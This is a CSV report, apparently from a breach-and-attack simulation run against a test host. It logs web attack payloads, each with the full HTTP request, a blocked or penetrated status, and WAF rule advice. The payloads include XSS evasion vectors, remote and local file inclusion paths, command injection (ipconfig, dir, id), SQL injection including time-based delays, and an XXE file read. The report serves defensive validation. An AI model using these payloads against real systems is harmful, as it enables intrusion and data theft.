"Source","Timestamp","Attack Type","URL","Action","Method","Payload","Input Name","Risk","Display URL","Status","Sub Category","Mitigation","Previous Status","Redirected","Full Request","Platform","Database"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:06","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","""><IMG SRC=""jav&#x09;ascript:alert('X');"">","hidden","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:""><IMG SRC=""jav&#x09;ascript:alert('X');"">.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 81
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":""\""><IMG SRC=\""jav&#x09;ascript:alert('X');\"">""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:06","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","/2007/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=https://app.cymulate.com","N/A","medium","https://ekslabs.cymulatedev.com/2007/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=https://app.cymulate.com","blocked","Remote File Inclusion","Create a WAF Security rule to block incoming requests that contains:/2007/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=https://app.cymulate.com.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Remote File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /2007/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=https://app.cymulate.com HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:06","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","/Beautifier/Core.php?BEAUT_PATH=https://app.cymulate.com?","N/A","medium","https://ekslabs.cymulatedev.com/Beautifier/Core.php?BEAUT_PATH=https://app.cymulate.com?","blocked","Remote File Inclusion","Create a WAF Security rule to block incoming requests that contains:/Beautifier/Core.php?BEAUT_PATH=https://app.cymulate.com?.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Remote File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /Beautifier/Core.php?BEAUT_PATH=https://app.cymulate.com? HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:05","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","""><img src=xx:xx# /onerror=alert(1)>","hidden","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:""><img src=xx:xx# /onerror=alert(1)>.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 73
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":""\""><img src=xx:xx# /onerror=alert(1)>""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:05","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","""><div id=""div1""><input value=""``onmouseover=javascript:alert(1)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>","hidden","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:""><div id=""div1""><input value=""``onmouseover=javascript:alert(1)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 244
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":""\""><div id=\""div1\""><input value=\""``onmouseover=javascript:alert(1)\""></div> <div id=\""div2\""></div><script>document.getElementById(\""div2\"").innerHTML = document.getElementById(\""div1\"").innerHTML;</script>""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:05","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","sysinfo","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03jf=sysinfo","penetrated","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:sysinfo.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03jf=sysinfo HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:05","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","& ipconfig /all","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03je=& ipconfig /all","penetrated","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:& ipconfig /all.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03je=&%20ipconfig%20/all= HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:04","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","'><script itworksinallbrowsers>/*<script* */alert(1)</script ​","tel","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:'><script itworksinallbrowsers>/*<script* */alert(1)</script ​.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 356
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":""'><script itworksinallbrowsers>/*<script* */alert(1)</script ​"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:04","XML Injections","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","<?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_2 SYSTEM \""file:///etc/lsb-release\"">]>","password","high","https://ekslabs.cymulatedev.com","blocked","XML External Entity (XXE)","Create a WAF Security rule to block incoming requests that contains:<?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_2 SYSTEM \""file:///etc/lsb-release\"">]>.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the XML External Entity (XXE) signature pack (XML Injections)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 441
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""<?xml version=\""1.0\"" encoding=\""ISO-8859-1\""?> <!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_2 SYSTEM \\\""file:///etc/lsb-release\\\"">]>"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:04","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","or username is not NULL or username = '","password","high","https://ekslabs.cymulatedev.com","penetrated","Generic SQL Injection","Create a WAF Security rule to block incoming requests that contains:or username is not NULL or username = '.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 331
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""or username is not NULL or username = '"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:03","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","%26%26+|+dir c:%255c","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03jd=%26%26+|+dir c:%255c","penetrated","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:%26%26+|+dir c:%255c.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03jd=%26%26+|+dir%20c:%255c HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:03","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","' OR 2 > 1","password","high","https://ekslabs.cymulatedev.com","blocked","Passive SQL Injection","Create a WAF Security rule to block incoming requests that contains:' OR 2 > 1.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Passive SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 302
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""' OR 2 > 1"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:03","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","); alert('XSS","hidden","low","https://ekslabs.cymulatedev.com","penetrated","Generic XSS","Create a WAF Security rule to block incoming requests that contains:); alert('XSS.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 49
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":""); alert('XSS""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:02","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","waitfor delay '0:0:20' /*","hidden","high","https://ekslabs.cymulatedev.com","penetrated","MSSQL Injection","Create a WAF Security rule to block incoming requests that contains:waitfor delay '0:0:20' /*.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the MSSQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 61
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":""waitfor delay '0:0:20' /*""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:02","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","a)|id","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03jc=a)|id","penetrated","Command Injection - Unix","Create a WAF Security rule to block incoming requests that contains:a)|id.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Unix signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03jc=a)|id HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","linux","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:02","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F","password","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 398
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""<script/src=\""data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\""></script a=\\u0061 & /=%2F"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:02","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","Password:*/=1--","hidden","high","https://ekslabs.cymulatedev.com","penetrated","Passive SQL Injection","Create a WAF Security rule to block incoming requests that contains:Password:*/=1--.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Passive SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 51
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":""Password:*/=1--""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:01","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","\php4\php.ini","N/A","medium","https://ekslabs.cymulatedev.com\php4\php.ini","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:\php4\php.ini.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /php4/php.ini HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
